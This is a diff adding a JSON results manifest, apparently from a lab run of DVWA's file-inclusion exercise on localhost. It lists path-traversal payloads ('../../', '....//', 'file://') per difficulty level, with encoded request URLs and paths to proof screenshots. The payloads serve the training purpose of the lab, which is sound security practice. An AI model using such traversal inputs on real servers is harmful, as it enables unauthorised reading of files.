@@ -1,0 +1,33 @@
+{
+  "generated_at": "2026-06-08T14:36:57+08:00",
+  "items": [
+    {
+      "difficulty": "low",
+      "page": "../../robots.txt",
+      "path": "dvwa-results\\file-inclusion-progression-20260608-143425\\screenshots\\proof\\low-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2F..%2Frobots.txt",
+      "timestamp": "2026-06-08T14:36:52+08:00"
+    },
+    {
+      "difficulty": "medium",
+      "page": "....//....//robots.txt",
+      "path": "dvwa-results\\file-inclusion-progression-20260608-143425\\screenshots\\proof\\medium-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=....%2F%2F....%2F%2Frobots.txt",
+      "timestamp": "2026-06-08T14:36:54+08:00"
+    },
+    {
+      "difficulty": "high",
+      "page": "file://D:/phpStudy/PHPTutorial/WWW/DVWA/robots.txt",
+      "path": "dvwa-results\\file-inclusion-progression-20260608-143425\\screenshots\\proof\\high-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3A%2F%2FD%3A%2FphpStudy%2FPHPTutorial%2FWWW%2FDVWA%2Frobots.txt",
+      "timestamp": "2026-06-08T14:36:55+08:00"
+    },
+    {
+      "difficulty": "impossible",
+      "page": "file://D:/phpStudy/PHPTutorial/WWW/DVWA/robots.txt",
+      "path": "dvwa-results\\file-inclusion-progression-20260608-143425\\screenshots\\proof\\impossible-proof.png",
+      "url": "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3A%2F%2FD%3A%2FphpStudy%2FPHPTutorial%2FWWW%2FDVWA%2Frobots.txt",
+      "timestamp": "2026-06-08T14:36:57+08:00"
+    }
+  ]
+}
